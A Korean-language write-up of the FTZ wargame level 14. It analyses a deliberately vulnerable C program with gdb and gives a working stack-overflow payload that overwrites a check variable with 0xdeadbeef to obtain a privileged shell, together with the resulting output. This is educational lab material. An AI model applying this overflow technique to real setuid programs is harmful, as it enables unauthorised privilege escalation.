# **FTZ LEVEL14**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
#include <unistd.h>
 
main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
```
`fgets( )`에서 **overflow**가 일어나고 if문에서 `deadbeef` 를 검사한다.

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38
0x08048496 <main+6>:	sub    esp,0x4
0x08048499 <main+9>:	push   ds:0x8049664
0x0804849f <main+15>:	push   0x2d
0x080484a1 <main+17>:	lea    eax,[ebp-56]
0x080484a4 <main+20>:	push   eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
0x080484aa <main+26>:	add    esp,0x10
0x080484ad <main+29>:	cmp    DWORD PTR [ebp-16],0xdeadbeef
0x080484b4 <main+36>:	jne    0x80484db <main+75>
0x080484b6 <main+38>:	sub    esp,0x8
0x080484b9 <main+41>:	push   0xc17
0x080484be <main+46>:	push   0xc17
0x080484c3 <main+51>:	call   0x8048380 <setreuid>
0x080484c8 <main+56>:	add    esp,0x10
0x080484cb <main+59>:	sub    esp,0xc
0x080484ce <main+62>:	push   0x8048548
0x080484d3 <main+67>:	call   0x8048340 <system>
0x080484d8 <main+72>:	add    esp,0x10
0x080484db <main+75>:	leave  
0x080484dc <main+76>:	ret    
0x080484dd <main+77>:	lea    esi,[esi]
End of assembler dump.
```
`main+17` 에서 `buf` 를 불러온다.  
`buf` 의 시작은 `ebp-56` 인 것을 알 수 있다.  
`main+29` 에서 `ebp-16`과 `deadbeef` 를 비교하므로 `ebp-16`부분에 `deadbeef` 를 넣으면 쉘을 획득할 수 있다.
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[20] | dummy[20] | deadbeef | dummy[12] | sfp | ret |
```

>Payload
```
(python -c "print 'A'*40+'\xef\xbe\xad\xde'";cat) | ./attackme
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level14@ftz level14]$ (python -c "print 'A'*40+'\xef\xbe\xad\xde'";cat) | ./attackme 
my-pass

Level15 Password is "~~~~~~~~~".
```